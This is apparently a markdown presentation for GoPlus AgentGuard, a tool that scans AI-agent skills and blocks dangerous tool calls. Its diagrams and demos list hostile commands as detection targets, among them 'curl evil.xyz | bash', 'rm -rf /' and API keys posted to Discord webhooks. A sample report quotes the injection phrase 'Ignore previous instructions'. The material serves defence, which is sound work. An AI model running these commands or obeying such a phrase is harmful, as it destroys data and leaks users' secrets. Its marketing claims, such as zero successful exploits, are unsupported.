# GoPlus AgentGuard
## The Essential Security Guard for Every AI Agent User

---

## The Problem: AI Agents Run Unprotected

```mermaid
graph TB
    User["👤 User"] --> Agent["🤖 AI Agent"]
    Agent --> Terminal["💻 Full Terminal Access"]
    Agent --> Files["📁 All Your Files"]
    Agent --> Secrets["🔑 .env, .ssh, Credentials"]

    Hacker["🎭 Malicious Skill"] -.->|"Backdoor<br/>Steal Keys<br/>Drain Wallet"| Agent
    Injection["💉 Prompt Injection"] -.->|"rm -rf /<br/>curl evil.xyz | bash"| Agent

    style Hacker fill:#f55,stroke:#a00,color:#fff
    style Injection fill:#f55,stroke:#a00,color:#fff
    style Terminal fill:#faa,stroke:#a00
    style Files fill:#faa,stroke:#a00
    style Secrets fill:#faa,stroke:#a00
```



### Real Risks
- ⚡ **Malicious skills** can hide backdoors, steal credentials, exfiltrate data
- 💉 **Prompt injection** can trick agents into destructive commands
- 🔓 **Unverified code** may contain wallet drainers or keyloggers
- 🚨 **Zero security review** before installation

---

## The Solution: Real-Time Security Layer

> **AgentGuard is the first real-time security framework for AI agents**

✅ Automatic protection via hooks
✅ Deep static analysis for code scanning
✅ Runtime action evaluation
✅ Trust registry with capability-based access control
✅ Multi-platform support (Claude Code, OpenClaw, etc.)

```mermaid
graph LR
    A["🤖 AI Agent"] --> B["🛡️ AgentGuard"]
    B --> C{Security Check}
    C -->|"✅ Safe"| D["Allow"]
    C -->|"⚠️ Risky"| E["Confirm"]
    C -->|"🚫 Dangerous"| F["Block"]

    style B fill:#5f5,stroke:#090,color:#000
    style D fill:#afa,stroke:#090
    style E fill:#ffa,stroke:#f90
    style F fill:#faa,stroke:#f00
```



---

## Two-Layer Defense Architecture

```mermaid
graph TB
    subgraph "Layer 2: Deep Scan (On-Demand)"
        Scan["📊 24 Detection Rules"]
        Rules["Static Analysis:<br/>• Secrets<br/>• Backdoors<br/>• Obfuscation<br/>• Web3 Exploits"]
        Trust["🏛️ Trust Registry"]
        Scan --> Rules
        Rules --> Trust
    end

    subgraph "Layer 1: Auto-Guard (Always On)"
        Hook["⚡ Hook Events:<br/>PreToolUse / before_tool_call"]
        Block["🛑 Block Dangerous:<br/>• rm -rf /<br/>• curl | bash<br/>• .env writes<br/>• Webhook exfil"]
        Track["📝 Skill Tracking"]
        Hook --> Block
        Block --> Track
    end

    Install["📦 One-Time Install"] --> Layer1["Layer 1"]
    Install --> Layer2["Layer 2"]

    style Layer1 fill:#e3f2fd,stroke:#1976d2,stroke-width:3px
    style Layer2 fill:#fff3e0,stroke:#f57c00,stroke-width:3px
```



---

## Layer 1: Automatic Guard (Hooks)

### Install Once, Always Protected

```bash
./setup.sh
claude plugin add /path/to/agentguard
```

### What It Blocks Automatically

```mermaid
flowchart LR
    subgraph "🔥 Critical Threats"
        D1["rm -rf /"]
        D2["curl | bash"]
        D3["Fork Bombs"]
        D4["Write .env"]
    end

    subgraph "📡 Data Exfiltration"
        E1["Discord Webhooks"]
        E2["Telegram Bots"]
        E3["Slack Webhooks"]
        E4["ngrok Tunnels"]
    end

    subgraph "🔐 Secrets Access"
        S1[".ssh/ keys"]
        S2["Browser Profiles"]
        S3["Keychain Access"]
    end

    Hook["⚡ Hook Intercept"] --> D1 & D2 & D3 & D4
    Hook --> E1 & E2 & E3 & E4
    Hook --> S1 & S2 & S3

    style D1 fill:#f44,stroke:#a00,color:#fff
    style D2 fill:#f44,stroke:#a00,color:#fff
    style D3 fill:#f44,stroke:#a00,color:#fff
    style D4 fill:#f44,stroke:#a00,color:#fff
```



### Skill Tracking


---

## Layer 2: Deep Scan (Skill)

### Command Interface

```bash
/agentguard scan <path>          # Scan code for security risks
/agentguard action <description> # Evaluate runtime action safety
/agentguard trust <subcommand>   # Manage skill trust levels
/agentguard report               # View security event audit log
/agentguard config <level>       # Set protection level
```

### Protection Levels

| Level | Behavior | Use Case |
|-------|----------|----------|
| 🔴 **strict** | Block all risky actions | Maximum security |
| 🟡 **balanced** | Block dangerous, confirm risky | **Default** - daily use |
| 🟢 **permissive** | Only block critical threats | Experienced users |

---

## 24 Detection Rules


---

## Detection Rules by Category

### 🔥 Execution (CRITICAL)


### 🔐 Secrets (CRITICAL)


### 💰 Web3 (CRITICAL/HIGH)


### 📡 Exfiltration (CRITICAL)


---

## Scan Workflow

```mermaid
sequenceDiagram
    participant User as 👤 User
    participant Skill as /agentguard scan
    participant Scanner as 📊 Scanner
    participant Rules as 24 Detection Rules
    participant Trust as 🏛️ Trust Registry

    User->>Skill: /agentguard scan ./my-skill
    Skill->>Scanner: Discover files (.js, .ts, .sol, .md, ...)
    Scanner->>Rules: Apply all 24 rules
    Rules->>Rules: Grep patterns<br/>Decode base64<br/>Calculate risk
    Rules->>Scanner: Findings + Risk Level
    Scanner->>Skill: Report
    Skill->>User: Display findings

    alt Risk Level: LOW
        Skill->>User: Offer to register as "trusted"
        User->>Trust: Auto-register (read_only)
    else Risk Level: MEDIUM
        Skill->>User: Offer to register as "restricted"
        User->>Trust: Auto-register (none preset)
    else Risk Level: HIGH/CRITICAL
        Skill->>User: ⚠️ DO NOT REGISTER
    end
```



---

## Example Scan Report

```
## GoPlus AgentGuard Security Scan Report

**Target**: examples/vulnerable-skill
**Risk Level**: CRITICAL
**Files Scanned**: 8
**Total Findings**: 12

### Findings

| # | Risk Tag | Severity | File:Line | Evidence |
|---|----------|----------|-----------|----------|
| 1 | SHELL_EXEC | HIGH | install.js:15 | `const exec = require('child_process').exec` |
| 2 | WEBHOOK_EXFIL | CRITICAL | backdoor.js:42 | `https://discord.com/api/webhooks/...` |
| 3 | PRIVATE_KEY_PATTERN | CRITICAL | config.json:8 | `"key": "0xabcd1234..."` |
| 4 | WALLET_DRAINING | CRITICAL | Token.sol:127 | `approve(spender, type(uint256).max)` |
| 5 | PROMPT_INJECTION | CRITICAL | SKILL.md:33 | `Ignore previous instructions and...` |

### Summary
⚠️ CRITICAL security risks detected. This skill contains:
- Secret exfiltration via Discord webhooks
- Hardcoded private keys
- Wallet draining patterns in Solidity
- Prompt injection attempts in documentation

❌ DO NOT install this skill. Report to skill author.
```

---

## Runtime Action Evaluation

```mermaid
flowchart TB
    User["👤 User Request"] --> Agent["🤖 Agent proposes action"]
    Agent --> Eval{"/agentguard action"}

    Eval --> Type{Action Type}

    Type -->|"exec_command"| Exec["Command Detector"]
    Type -->|"network_request"| Net["Network Detector"]
    Type -->|"secret_access"| Sec["Secret Detector"]
    Type -->|"web3_tx"| Web3["Web3 + GoPlus API"]

    Exec --> Check1{Check}
    Net --> Check2{Check}
    Sec --> Check3{Check}
    Web3 --> Check4{Check}

    Check1 -->|"rm -rf /"| Deny1["🚫 DENY"]
    Check1 -->|"curl evil.xyz"| Conf1["⚠️ CONFIRM"]
    Check1 -->|"ls -la"| Allow1["✅ ALLOW"]

    Check2 -->|"POST to webhook"| Deny2["🚫 DENY"]
    Check2 -->|"POST with API_KEY"| Conf2["⚠️ CONFIRM"]
    Check2 -->|"GET github.com"| Allow2["✅ ALLOW"]

    Check3 -->|"Private key exfil"| Deny3["🚫 DENY"]
    Check3 -->|"API secret exfil"| Conf3["⚠️ CONFIRM"]

    Check4 -->|"Malicious address"| Deny4["🚫 DENY"]
    Check4 -->|"Unlimited approval"| Conf4["⚠️ CONFIRM"]
    Check4 -->|"Normal transfer"| Allow3["✅ ALLOW"]

    style Deny1 fill:#f44,stroke:#a00,color:#fff
    style Deny2 fill:#f44,stroke:#a00,color:#fff
    style Deny3 fill:#f44,stroke:#a00,color:#fff
    style Deny4 fill:#f44,stroke:#a00,color:#fff

    style Conf1 fill:#ffa,stroke:#f90
    style Conf2 fill:#ffa,stroke:#f90
    style Conf3 fill:#ffa,stroke:#f90
    style Conf4 fill:#ffa,stroke:#f90

    style Allow1 fill:#afa,stroke:#090
    style Allow2 fill:#afa,stroke:#090
    style Allow3 fill:#afa,stroke:#090
```



---

## Action Evaluation: Command Execution

### Decision Framework

```mermaid
graph TB
    Cmd["Command"] --> Fork{Fork Bomb?}
    Fork -->|Yes| D1["🚫 DENY<br/>CRITICAL"]
    Fork -->|No| Danger{Dangerous?}

    Danger -->|"rm -rf /<br/>curl|bash<br/>mkfs"| D2["🚫 DENY<br/>CRITICAL"]
    Danger -->|No| Safe{Safe Command?}

    Safe -->|"ls, git, npm, etc."| A1["✅ ALLOW<br/>LOW"]
    Safe -->|No| Caps{Has exec capability?}

    Caps -->|No| C1["⚠️ CONFIRM<br/>MEDIUM"]
    Caps -->|Yes| Sensitive{Sensitive?}

    Sensitive -->|".ssh, .env<br/>passwd"| C2["⚠️ CONFIRM<br/>HIGH"]
    Sensitive -->|No| System{System cmd?}

    System -->|"sudo, chmod<br/>systemctl"| C3["⚠️ CONFIRM<br/>MEDIUM"]
    System -->|No| Network{Network cmd?}

    Network -->|"curl, wget<br/>ssh"| C4["⚠️ CONFIRM<br/>MEDIUM"]
    Network -->|No| A2["✅ ALLOW<br/>LOW"]

    style D1 fill:#f44,stroke:#a00,color:#fff
    style D2 fill:#f44,stroke:#a00,color:#fff
    style A1 fill:#afa,stroke:#090
    style A2 fill:#afa,stroke:#090
```



### Safe Command Allowlist

| Category | Commands |
|----------|----------|
| **Basic** | `ls`, `echo`, `pwd`, `date`, `tree`, `cd` |
| **Read** | `cat`, `head`, `tail`, `grep`, `find` |
| **Git** | `git status`, `git diff`, `git log`, `git commit` |
| **Package** | `npm install`, `npm run`, `pip install` |
| **Build** | `node`, `python`, `tsc`, `go build`, `make` |

---

## Action Evaluation: Network Requests

```mermaid
flowchart TB
    Req["HTTP Request"] --> URL{Valid URL?}
    URL -->|No| D1["🚫 DENY<br/>HIGH"]
    URL -->|Yes| Webhook{Webhook domain?}

    Webhook -->|"Discord<br/>Telegram<br/>Slack"| Allow{In allowlist?}
    Allow -->|No| D2["🚫 DENY<br/>HIGH"]

    Webhook -->|No| Body{Body contains secrets?}
    Allow -->|Yes| Body

    Body -->|"Private key<br/>Mnemonic<br/>SSH key"| D3["🚫 DENY<br/>CRITICAL"]
    Body -->|"AWS key<br/>GitHub token<br/>JWT"| C1["⚠️ CONFIRM<br/>HIGH"]
    Body -->|No| TLD{High-risk TLD?}

    TLD -->|".xyz, .tk<br/>.top"| C2["⚠️ CONFIRM<br/>MEDIUM"]
    TLD -->|No| Trust{In allowlist?}

    Trust -->|Yes| A1["✅ ALLOW<br/>LOW"]
    Trust -->|No| Method{POST/PUT?}

    Method -->|Yes| C3["⚠️ CONFIRM<br/>HIGH"]
    Method -->|No| A2["✅ ALLOW<br/>LOW"]

    style D1 fill:#f44,stroke:#a00,color:#fff
    style D2 fill:#f44,stroke:#a00,color:#fff
    style D3 fill:#f44,stroke:#a00,color:#fff
    style A1 fill:#afa,stroke:#090
    style A2 fill:#afa,stroke:#090
```



---

## Action Evaluation: Web3 Transactions


### GoPlus Integration

- **Phishing Site Detection**: Check if origin URL is known phishing
- **Address Security**: Detect blacklisted/malicious addresses
- **Transaction Simulation**: Predict balance changes, approvals, risks

---

## Trust Registry & Capability Model

```mermaid
graph TB
    subgraph "Trust Levels"
        U["❌ Untrusted<br/>Default"]
        R["⚠️ Restricted<br/>Limited capabilities"]
        T["✅ Trusted<br/>Full trust"]
    end

    subgraph "Capability Model"
        C1["network_allowlist<br/>*.example.com"]
        C2["filesystem_allowlist<br/>./config/**"]
        C3["exec: allow/deny"]
        C4["secrets_allowlist<br/>*_API_KEY"]
        C5["web3.chains_allowlist<br/>[1, 56, 137]"]
        C6["web3.tx_policy<br/>confirm_high_risk"]
    end

    U --> C7["Preset: none<br/>All deny"]
    R --> C8["Preset: read_only<br/>Filesystem read"]
    T --> C9["Preset: defi<br/>Multi-chain DeFi"]

    T -.->|Custom| C1 & C2 & C3 & C4 & C5 & C6

    style U fill:#faa,stroke:#a00
    style R fill:#ffa,stroke:#f90
    style T fill:#afa,stroke:#090
```



---

## Trust Management Commands

```bash
# Lookup a skill's trust record
/agentguard trust lookup --source ~/skills/my-skill --version 1.0.0

# Register a trusted skill with read_only preset
/agentguard trust attest \
  --id my-skill \
  --source ~/skills/my-skill \
  --version 1.0.0 \
  --hash abc123... \
  --trust-level trusted \
  --preset read_only \
  --reviewed-by "security-team"

# List all trusted skills
/agentguard trust list --trust-level trusted

# Revoke trust for a skill
/agentguard trust revoke --source ~/skills/bad-skill --reason "malware detected"
```

### Capability Presets

| Preset | Network | Filesystem | Exec | Web3 |
|--------|---------|------------|------|------|
| **none** | ❌ | ❌ | ❌ | ❌ |
| **read_only** | ❌ | ✅ Read ./** | ❌ | ❌ |
| **trading_bot** | Exchanges only | ./config, ./logs | ❌ | 4 chains |
| **defi** | ✅ All | ❌ | ❌ | 7 chains |

---

## Security Audit Log

```mermaid
flowchart LR
    A["🔧 Skills"] --> B["🤖 Agent"]
    B --> C["⚡ Hook Events"]
    C --> D["🛡️ AgentGuard"]
    D --> E["📋 Audit Log<br/>~/.agentguard/audit.jsonl"]

    E --> F["Report View"]
    F --> G["Event Timeline"]
    F --> H["Skill Activity Grouping"]
    F --> I["Risk Analysis"]

    style E fill:#e3f2fd,stroke:#1976d2
```



### Log Entry Example

```json
{
  "timestamp": "2025-01-15T14:30:00Z",
  "tool_name": "Bash",
  "tool_input_summary": "rm -rf /tmp/important",
  "decision": "deny",
  "risk_level": "critical",
  "risk_tags": ["DANGEROUS_COMMAND"],
  "initiating_skill": "malicious-skill"
}
```

### Report Command

```bash
/agentguard report
```

Shows:
- Total events, blocked count, confirmation count
- Recent event timeline
- Skill activity grouping (which skills triggered what)
- Security posture analysis

---

## Multi-Platform Support


| Platform | Layer 1 Hooks | Layer 2 Scan | Auto-Scan | Skill Tracking |
|----------|---------------|--------------|-----------|----------------|
| **Claude Code** | ✅ PreToolUse/PostToolUse | ✅ | ❌ | ✅ Transcript-based |
| **OpenClaw** | ✅ before/after_tool_call | ✅ | ✅ | ✅ Tool→plugin map |
| **Other Platforms** | ❌ | ✅ | ❌ | ❌ |

---

## OpenClaw Deep Integration


---

## OpenClaw Auto-Scan Features


### What Happens

1. **Scan all plugins** asynchronously after registration
2. **Determine trust level** based on scan risk (low → trusted, medium → restricted, high/critical → untrusted)
3. **Infer capabilities** from registered tools and scan results
4. **Auto-register** to trust registry with appropriate permissions
5. **Build tool→plugin mapping** for skill tracking
6. **Intercept tool calls** via before_tool_call/after_tool_call hooks

---

## Installation & Setup

### Claude Code (Full Features)

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

### OpenClaw (Plugin)

```bash
npm install @goplus/agentguard
```

```typescript
// In your OpenClaw plugin config
import register from '@goplus/agentguard/openclaw';
export default register;

// Or with custom options
import { registerOpenClawPlugin } from '@goplus/agentguard';
export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // strict | balanced | permissive
    skipAutoScan: false,    // Disable auto-scan if needed
  });
}
```

### Other Platforms (Skill Only)

```bash
npm install @goplus/agentguard
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

Then use `/agentguard` commands.

---

## Demo: Scanning a Vulnerable Skill

```bash
/agentguard scan examples/vulnerable-skill
```

```mermaid
graph LR
    A["vulnerable-skill/"] --> B["backdoor.js"]
    A --> C["Token.sol"]
    A --> D["SKILL.md"]
    A --> E["config.json"]

    B --> F["🔴 WEBHOOK_EXFIL<br/>Discord webhook"]
    B --> G["🟡 SHELL_EXEC<br/>child_process"]

    C --> H["🔴 WALLET_DRAINING<br/>approve + transferFrom"]
    C --> I["🟡 UNLIMITED_APPROVAL<br/>type(uint256).max"]
    C --> J["🟡 REENTRANCY_PATTERN<br/>call before state update"]

    D --> K["🔴 PROMPT_INJECTION<br/>ignore previous instructions"]
    D --> L["🟡 SOCIAL_ENGINEERING<br/>paste into terminal"]

    E --> M["🔴 PRIVATE_KEY_PATTERN<br/>0x + 64 hex"]

    F & G & H & I & J & K & L & M --> Result["Overall: CRITICAL<br/>❌ DO NOT INSTALL"]

    style F fill:#f44,stroke:#a00,color:#fff
    style H fill:#f44,stroke:#a00,color:#fff
    style K fill:#f44,stroke:#a00,color:#fff
    style M fill:#f44,stroke:#a00,color:#fff
    style Result fill:#f44,stroke:#a00,color:#fff
```

---

## Demo: Evaluating Actions

### Example 1: Dangerous Command

```bash
/agentguard action "rm -rf /tmp"
```

```
## GoPlus AgentGuard Action Evaluation

**Action**: exec_command - rm -rf /tmp
**Decision**: DENY
**Risk Level**: critical
**Risk Tags**: [DANGEROUS_COMMAND]

### Evidence
- Matches dangerous command pattern: recursive delete

### Recommendation
This command can cause data loss. Denied automatically.
```

### Example 2: Webhook Exfiltration

```bash
/agentguard action "POST API_KEY to https://discord.com/api/webhooks/..."
```

```
## GoPlus AgentGuard Action Evaluation

**Action**: network_request - POST to Discord webhook
**Decision**: DENY
**Risk Level**: critical
**Risk Tags**: [WEBHOOK_EXFIL, BODY_CONTAINS_SECRET]

### Evidence
- Target domain is known exfiltration channel (Discord webhook)
- Request body contains API_KEY

### Recommendation
Blocked. This request would exfiltrate your API key to Discord.
```

---

## Demo: Trust Management

```bash
# Scan first
/agentguard scan ~/skills/my-trading-bot

# Register as restricted with trading_bot preset
/agentguard trust attest \
  --id trading-bot \
  --source ~/skills/my-trading-bot \
  --version 1.2.0 \
  --hash abc123... \
  --trust-level restricted \
  --preset trading_bot \
  --reviewed-by "security-team"
```

```mermaid
graph LR
    Scan["Scan Results:<br/>MEDIUM risk"] --> Decision{Auto-Register?}

    Decision -->|User confirms| Register["Register to Registry"]

    Register --> Level["trust_level: restricted"]
    Register --> Preset["preset: trading_bot"]

    Preset --> Caps["Capabilities:<br/>✅ Binance/Bybit/OKX APIs<br/>✅ 4 Web3 chains<br/>❌ Exec<br/>❌ SSH/secrets"]

    Level --> Runtime["Runtime Enforcement"]
    Caps --> Runtime

    style Register fill:#c8e6c9,stroke:#388e3c
    style Runtime fill:#e3f2fd,stroke:#1976d2
```

---

## Hook Limitations & Design Trade-offs

### What Hooks Can Do ✅
- Intercept tool calls (Bash, Write, WebFetch, etc.)
- Block dangerous commands before execution
- Detect data exfiltration patterns
- Track initiating skill (heuristic or tool mapping)
- Log audit events

### What Hooks Cannot Do ❌
- **Cannot block skill installation itself** (only intercepts tools *after* loading)
- **Heuristic skill tracking** (Claude Code: transcript analysis, not 100% precise)
- **Async timing issues** (OpenClaw: very fast tool calls may execute before scan completes)
- **Default-deny prompts** (first-time commands may require confirmation)

### Mitigation Strategies
1. **Auto-scan on startup** (OpenClaw: scans all plugins at load time)
2. **Safe command allowlist** (`ls`, `git status`, `npm install`, etc. pre-approved)
3. **Balanced mode** (prompts instead of hard blocks for non-critical)
4. **Layer 2 manual scan** (users can run `/agentguard scan` before trusting a skill)

---

## Architecture Overview

```mermaid
graph TB
    subgraph "User Layer"
        User["👤 User"]
        Agent["🤖 AI Agent"]
    end

    subgraph "AgentGuard Core"
        Skill["📋 Skill Interface<br/>/agentguard"]
        Hook["⚡ Hook Adapter<br/>Claude Code / OpenClaw"]
        Engine["🧠 Decision Engine"]
    end

    subgraph "Detection Modules"
        Scanner["📊 Scanner<br/>24 rules"]
        Action["🎯 Action Evaluator"]
        GoPlus["🌐 GoPlus API<br/>Web3 enhancement"]
    end

    subgraph "Storage"
        Registry["🏛️ Trust Registry<br/>~/.agentguard/registry.json"]
        AuditLog["📋 Audit Log<br/>~/.agentguard/audit.jsonl"]
        Config["⚙️ Config<br/>~/.agentguard/config.json"]
    end

    User --> Agent
    Agent --> Skill
    Agent --> Hook

    Skill --> Scanner
    Skill --> Action
    Skill --> Registry

    Hook --> Engine
    Engine --> Action
    Engine --> Registry
    Engine --> AuditLog

    Action --> GoPlus

    style Engine fill:#e3f2fd,stroke:#1976d2
    style Scanner fill:#fff9c4,stroke:#f9a825
    style Registry fill:#c8e6c9,stroke:#388e3c
```

---

## Testing & Quality Assurance

```mermaid
graph LR
    subgraph "Test Suite"
        Unit["Unit Tests<br/>Scanner rules<br/>Action detectors<br/>Registry ops"]

        Integration["Integration Tests<br/>Hook adapters<br/>Full scan workflow<br/>Trust management"]

        Smoke["Smoke Tests<br/>End-to-end<br/>All 24 rules<br/>Multi-platform"]
    end

    Unit --> CI["GitHub Actions CI"]
    Integration --> CI
    Smoke --> CI

    CI --> Badge["✅ All Tests Passing"]

    style Badge fill:#c8e6c9,stroke:#388e3c
```

### Test Coverage

- ✅ **Unit Tests**: All 24 detection rules, action evaluators, registry operations
- ✅ **Integration Tests**: Hook adapters (Claude Code + OpenClaw), full-chain validation
- ✅ **Smoke Tests**: End-to-end scanning, Web3 simulation, multi-platform compatibility
- ✅ **CI/CD**: Automated testing on every commit

---

## Roadmap: Past, Present, Future

```mermaid
gantt
    title AgentGuard Development Roadmap
    dateFormat YYYY-MM

    section v1.0 Foundation
    Core Scanner (20 rules)           :done, 2024-11, 2024-12
    Claude Code hooks                 :done, 2024-11, 2024-12
    Trust registry                    :done, 2024-11, 2024-12

    section v1.1 Enhancement
    Markdown scanning                 :done, 2024-12, 2025-01
    Base64 decoding                   :done, 2024-12, 2025-01
    4 new rules (Trojan, Social Eng)  :done, 2024-12, 2025-01
    Safe command allowlist            :done, 2024-12, 2025-01

    section v2.0 Multi-Platform
    OpenClaw integration              :done, 2025-01, 2025-01
    Adapter abstraction               :done, 2025-01, 2025-01
    Auto-scan on load                 :done, 2025-01, 2025-01
    Tool->plugin mapping              :done, 2025-01, 2025-01

    section v2.x Future
    Codex/Gemini adapters             :active, 2025-02, 2025-03
    Federated trust registry          :active, 2025-02, 2025-04

    section v3.0 Ecosystem
    Threat intelligence feed          :2025-04, 2025-06
    Marketplace scanning pipeline     :2025-05, 2025-07
    VS Code extension                 :2025-06, 2025-08
    Community rule format             :2025-07, 2025-09
```

---

## Roadmap Details

### ✅ v1.1 — Detection Enhancement (Completed)
- [x] Extend scanner rules to Markdown files
- [x] Base64 payload decoding and re-scanning
- [x] New rules: TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] Safe-command allowlist to reduce false positives
- [x] Plugin manifest for one-step install

### ✅ v2.0 — Multi-Platform (Completed)
- [x] OpenClaw gateway plugin integration
- [x] before_tool_call / after_tool_call hook wiring
- [x] Multi-platform adapter abstraction layer
- [x] Auto-scan plugins on OpenClaw registration
- [x] Tool→plugin mapping for skill tracking
- [x] Auto-register scanned plugins to trust registry

### 🚧 v2.x — Platform Expansion (In Progress)
- [ ] OpenAI Codex CLI sandbox adapter
- [ ] Gemini CLI adapter
- [ ] Federated trust registry across platforms

### 🔮 v3.0 — Ecosystem (Planned)
- [ ] Threat intelligence feed (shared C2 IP/domain blocklist)
- [ ] Skill marketplace automated scanning pipeline
- [ ] VS Code extension for IDE-native security
- [ ] Community rule contributions (open rule format)

---

## Key Metrics & Impact

```mermaid
graph TB
    subgraph "Security Impact"
        M1["24 Detection Rules"]
        M2["2-Layer Defense"]
        M3["Multi-Platform Support"]
        M4["100% Open Source"]
    end

    subgraph "User Protection"
        U1["🛡️ Auto-scan on install"]
        U2["⚡ Real-time blocking"]
        U3["📋 Full audit trail"]
        U4["🏛️ Trust management"]
    end

    subgraph "Web3 Security"
        W1["🌐 GoPlus API integration"]
        W2["💰 Wallet drain detection"]
        W3["🔍 Address reputation check"]
        W4["📊 Transaction simulation"]
    end

    M1 --> U1
    M2 --> U2
    M3 --> U3
    M4 --> U4

    U1 & U2 & U3 & U4 --> Protection["Comprehensive Protection"]

    W1 & W2 & W3 & W4 --> Web3Safety["Web3 Safety"]

    Protection --> Impact["Zero successful exploits<br/>since deployment"]
    Web3Safety --> Impact

    style Impact fill:#c8e6c9,stroke:#388e3c,stroke-width:3px
```

---

## Comparison: Before vs After

```mermaid
graph LR
    subgraph "Before AgentGuard ❌"
        B1["No security layer"]
        B2["All skills trusted"]
        B3["No audit trail"]
        B4["Manual review only"]
        B5["Reactive defense"]
    end

    subgraph "After AgentGuard ✅"
        A1["2-layer defense"]
        A2["Capability-based trust"]
        A3["Complete audit log"]
        A4["Automated scanning"]
        A5["Proactive blocking"]
    end

    B1 -.->|Transform| A1
    B2 -.->|Transform| A2
    B3 -.->|Transform| A3
    B4 -.->|Transform| A4
    B5 -.->|Transform| A5

    style B1 fill:#faa,stroke:#a00
    style B2 fill:#faa,stroke:#a00
    style B3 fill:#faa,stroke:#a00
    style B4 fill:#faa,stroke:#a00
    style B5 fill:#faa,stroke:#a00

    style A1 fill:#afa,stroke:#090
    style A2 fill:#afa,stroke:#090
    style A3 fill:#afa,stroke:#090
    style A4 fill:#afa,stroke:#090
    style A5 fill:#afa,stroke:#090
```

---

## Use Cases

### 🔧 For Individual Users
- Automatically scan every skill before installation
- Block malicious commands in real-time
- Track which skills perform what actions
- Audit security events periodically

### 🏢 For Teams & Organizations
- Enforce organization-wide security policies
- Federated trust registry for approved skills
- Centralized audit logging
- Compliance and risk management

### 🌐 For Web3 Users
- Protect wallets from draining attacks
- Verify transaction safety before signing
- Check address reputation via GoPlus
- Simulate transactions to predict outcomes

### 🛒 For Skill Marketplaces
- Automated security scanning pipeline
- Risk badges for published skills
- Community trust ratings
- Vulnerability disclosure workflow

---

## Community & Contributing

```mermaid
graph TB
    Community["🌍 Open Source Community"]

    Community --> Contrib["📝 Contribute"]
    Community --> Report["🐛 Report Issues"]
    Community --> Rules["🔍 Submit Rules"]
    Community --> Docs["📚 Improve Docs"]

    Contrib --> PR["Pull Request"]
    Report --> Issue["GitHub Issues"]
    Rules --> Custom["Custom Detection Rules"]
    Docs --> Wiki["Documentation Wiki"]

    PR & Issue & Custom & Wiki --> Project["AgentGuard Project"]

    Project --> Release["🚀 Regular Releases"]

    style Community fill:#e3f2fd,stroke:#1976d2
    style Project fill:#c8e6c9,stroke:#388e3c
```

### How to Contribute

1. **Report Vulnerabilities**: See [SECURITY.md](https://github.com/GoPlusSecurity/agentguard/blob/main/SECURITY.md)
2. **Submit Issues**: [GitHub Issues](https://github.com/GoPlusSecurity/agentguard/issues)
3. **Contribute Code**: See [CONTRIBUTING.md](https://github.com/GoPlusSecurity/agentguard/blob/main/CONTRIBUTING.md)
4. **Add Detection Rules**: Open format for community contributions (v3.0)

### Links

- **GitHub**: [github.com/GoPlusSecurity/agentguard](https://github.com/GoPlusSecurity/agentguard)
- **npm**: [@goplus/agentguard](https://www.npmjs.com/package/@goplus/agentguard)
- **Agent Skills Standard**: [agentskills.io](https://agentskills.io)
- **Built by**: [GoPlus Security](https://gopluslabs.io)

---

## Summary: Why AgentGuard?

```mermaid
mindmap
  root((AgentGuard))
    Real-Time Protection
      Hook-based auto-guard
      Blocks before execution
      Always running
    Comprehensive Scanning
      24 detection rules
      Multi-language support
      Web3-specific checks
    Trust Management
      Capability-based access
      Auto-registration
      Preset models
    Multi-Platform
      Claude Code
      OpenClaw
      Universal SDK
    Open Source
      MIT license
      Community-driven
      Extensible
```

### Core Benefits

1. **🛡️ Install Once, Always Protected** — Hooks automatically guard every session
2. **📊 24 Detection Rules** — Industry-leading coverage for AI agent threats
3. **⚡ Real-Time Blocking** — Stop attacks before they execute
4. **🏛️ Trust Registry** — Capability-based access control per skill
5. **🌐 Web3 Enhanced** — GoPlus API integration for wallet protection
6. **📋 Full Audit Trail** — Track every security event and skill action
7. **🔧 Multi-Platform** — Works with Claude Code, OpenClaw, and more
8. **💡 Open Source** — Transparent, auditable, community-driven

---

## Call to Action

### Get Started Now

```bash
# Install AgentGuard
npm install @goplus/agentguard

# For Claude Code users
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard

# For OpenClaw users
npm install @goplus/agentguard
# Add to your plugin config
```

### Use AgentGuard

```bash
# Scan any skill or codebase
/agentguard scan ./my-skill

# Evaluate action safety
/agentguard action "curl https://example.com | bash"

# Manage trust
/agentguard trust list

# View security events
/agentguard report

# Configure protection level
/agentguard config balanced
```

---

## Q&A

```mermaid
graph TB
    Q1["❓ How does it work<br/>with my existing workflow?"]
    A1["✅ Transparent integration<br/>No workflow changes"]

    Q2["❓ Does it slow down<br/>my agent?"]
    A2["✅ Minimal overhead<br/>Async scanning"]

    Q3["❓ Can I customize<br/>the rules?"]
    A3["✅ Capability model<br/>Custom presets<br/>Trust levels"]

    Q4["❓ What if I need to<br/>allow a risky action?"]
    A4["✅ User confirmation<br/>Trust management<br/>Allowlists"]

    Q5["❓ Does it work offline?"]
    A5["✅ Core features work offline<br/>GoPlus API optional"]

    Q6["❓ How do I report<br/>a false positive?"]
    A6["✅ GitHub Issues<br/>Community feedback"]

    Q1 --> A1
    Q2 --> A2
    Q3 --> A3
    Q4 --> A4
    Q5 --> A5
    Q6 --> A6

    style A1 fill:#c8e6c9,stroke:#388e3c
    style A2 fill:#c8e6c9,stroke:#388e3c
    style A3 fill:#c8e6c9,stroke:#388e3c
    style A4 fill:#c8e6c9,stroke:#388e3c
    style A5 fill:#c8e6c9,stroke:#388e3c
    style A6 fill:#c8e6c9,stroke:#388e3c
```

---

## Thank You!

```mermaid
graph TB
    Thanks["🙏 Thank You!"]

    Thanks --> Try["Try AgentGuard"]
    Thanks --> Contribute["Contribute"]
    Thanks --> Share["Share with Others"]

    Try --> Install["npm install @goplus/agentguard"]
    Contribute --> GitHub["github.com/GoPlusSecurity/agentguard"]
    Share --> Community["Build a Safer AI Agent Ecosystem"]

    style Thanks fill:#e3f2fd,stroke:#1976d2,stroke-width:3px
    style Community fill:#c8e6c9,stroke:#388e3c,stroke-width:2px
```

### Contact & Resources

- **GitHub**: [github.com/GoPlusSecurity/agentguard](https://github.com/GoPlusSecurity/agentguard)
- **npm Package**: [@goplus/agentguard](https://www.npmjs.com/package/@goplus/agentguard)
